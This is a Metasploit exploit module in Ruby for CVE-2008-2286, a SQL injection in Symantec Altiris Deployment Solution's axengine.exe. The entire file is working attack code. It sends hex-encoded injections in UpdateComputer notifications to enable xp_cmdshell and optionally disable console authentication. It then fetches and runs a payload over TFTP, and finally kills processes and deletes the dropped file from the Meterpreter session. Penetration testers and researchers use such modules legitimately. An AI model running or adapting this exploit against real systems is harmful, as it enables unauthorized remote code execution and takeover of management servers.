##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
class Metasploit3 < Msf::Exploit::Remote
 Rank = NormalRanking
 
 include Msf::Exploit::CmdStagerTFTP
 include Msf::Exploit::Remote::Tcp
 
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Symantec Altiris DS SQL Injection',
      'Description'    => %q{
        This module exploits a SQL injection flaw in Symantec Altiris Deployment Solution 6.8
        to 6.9.164. The vulnerability exists on axengine.exe which fails to adequately sanitize
        numeric input fields in "UpdateComputer" notification Requests. In order to spawn a shell,
        several SQL injections are required in close succession, first to enable xp_cmdshell, then
        retrieve the payload via TFTP and finally execute it. The module also has the capability
        to disable or enable local application authentication. In order to work the target system
        must have a tftp client available.
      },
      'Author'         =>
        [
          'Brett Moore',  # Vulnerability discovery
          '3v0lver'       # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2008-2286' ],
          [ 'OSVDB', '45313' ],
          [ 'BID', '29198'],
          [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-08-024' ]
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
        },
      'Targets' =>
        [
          [ 'Windows 2003 (with tftp client available)',
            {
              'Arch' => ARCH_X86,
              'Platform' => 'win'
            }
          ]
        ],
      'Privileged' => true,
      'Platform' => 'win',
      'DisclosureDate' => 'May 15 2008',
      'DefaultTarget' => 0))
 
    register_options(
    [
      Opt::RPORT(402),
      OptBool.new('XP_CMDSHELL',      [ true, "Enable xp_cmdshell prior to exploit", true]),
      OptBool.new('DISABLE_SECURITY', [ true, "Exploit SQLi to execute wc_upd_disable_security and disable Console Authentication", false ]),
      OptBool.new('ENABLE_SECURITY',  [ true, "Enable Local Deployment Console Authentication", false ])
    ], self.class)
 
  end
 
  def execute_command(cmd, opts = {})
    inject=[]
 
    if @xp_shell_enable
      inject+=[
        "#{Rex::Text.to_hex("sp_configure \"show advanced options\", 1; reconfigure",'')}",
        "#{Rex::Text.to_hex("sp_configure \"xp_cmdshell\", 1; reconfigure",'')}",
      ]
      @xp_shell_enable = false
    end
 
    if @wc_disable_security
      inject+=["#{Rex::Text.to_hex("wc_upd_disable_security",'')}"]
      @wc_disable_security = false
    end
 
    if @wc_enable_security
      inject+=["#{Rex::Text.to_hex("wc_upd_enable_security",'')}"]
      @wc_enable_security = false
    end
 
    inject+=["#{Rex::Text.to_hex("master.dbo.xp_cmdshell \'cd %TEMP% && cmd.exe /c #{cmd}\'",'')}"] if cmd != nil
 
    inject.each do |sqli|
      send_update_computer("2659, null, null;declare @querya VARCHAR(255);select @querya = 0x#{sqli};exec(@querya);--")
    end
  end
 
 def send_update_computer(processor_speed)
   notification = %Q|Request=UpdateComputer
OS-Bit=32
CPU-Arch=x86
IP-Address=192.168.20.107
MAC-Address=005056C000AB
Name=Remove_test
OS=Windows XP
Version=2.6-38 (32-Bit)
LoggedIn=Yes
Boot-Env=Automation
Platform=Linux
Agent-Settings=Same
Sys-Info-TimeZoneBias=0
Processor=Genuine Intel Intel(R) Core(TM) i7 CPU M 620 @ 2.67GHz
Processor-Speed=#{processor_speed}
   \x00
   |
 
   connect
   sock.put(notification)
   response = sock.get_once()
   disconnect
 
   return response
 end
 
  def check
    res = send_update_computer("2659")
 
    unless res and res =~ /Result=Success/ and res=~ /DSVersion=(.*)/
      return Exploit::CheckCode::Unknown
    end
 
    version = $1
 
    unless version =~ /^6\.(\d+)\.(\d+)$/
      return Exploit::CheckCode::Safe
    end
 
    print_status "#{rhost}:#{rport} - Altiris DS Version '#{version}'"
 
    minor = $1.to_i
    build = $2.to_i
 
    if minor == 8
      if build == 206 || build == 282 || build == 378
        return Exploit::CheckCode::Vulnerable
      elsif build < 390
        return Exploit::CheckCode::Appears
      end
    elsif minor == 9 and build < 176
      #The existence of versions matching this profile is a possibility... none were observed in the wild though
      #as such, we're basing confidence off of Symantec's vulnerability bulletin.
      return Exploit::CheckCode::Appears
    end
 
    return Exploit::CheckCode::Safe
  end
 
  def exploit
    @wc_disable_security = datastore['DISABLE_SECURITY']
    @wc_enable_security = datastore['ENABLE_SECURITY']
    @xp_shell_enable = datastore['XP_CMDSHELL']
 
    # CmdStagerVBS was tested here as well, however delivery took roughly
    # 30 minutes and required sending almost 350 notification messages.
    # size constraint requirement for SQLi is: linemax => 393
    execute_cmdstager({ :delay => 1.5, :temp => '%TEMP%\\'})
  end
 
  def on_new_session(client)
    return if not payload_exe
 
    #can't scrub dropped payload while the process is still active so...
    #iterate through process list, find our process and the associated
    #parent process ID, Kill the parent.
    #This module doesn't use FileDropper because of timing issues when
    #using migrate -f and FileDropper. On the other hand PrependMigrate
    #has been avoided because of issues with reverse_https payload
    #SeeRM#8365 https://http://dev.metasploit.com/redmine/issues/8365
 
    unless client.type == "meterpreter"
      print_error("Automatic cleanup only available with meterpreter, please delete #{payload_exe} manually")
      return
    end
 
    client.core.use("stdapi") unless client.ext.aliases.include?("stdapi")
    # migrate
    print_status("Migrating ...")
    client.console.run_single("run migrate -f")
    # kill the parent process so the payload can hopefully be dropped
    print_status("Kill parent process ...")
    client.sys.process.get_processes().each do |proc|
      if proc['pid'] == client.sys.process.open.pid
          client.sys.process.kill(proc['ppid'])
      end
    end
 
    win_temp = client.fs.file.expand_path("%TEMP%")
    win_file = "#{win_temp}\\#{payload_exe}"
    print_status("Attempting to delete #{win_file} ...")
    client.shell_command_token(%Q|attrib.exe -r #{win_file}|)
    client.fs.file.rm(win_file)
    print_good("Deleted #{win_file}")
  end
 
end
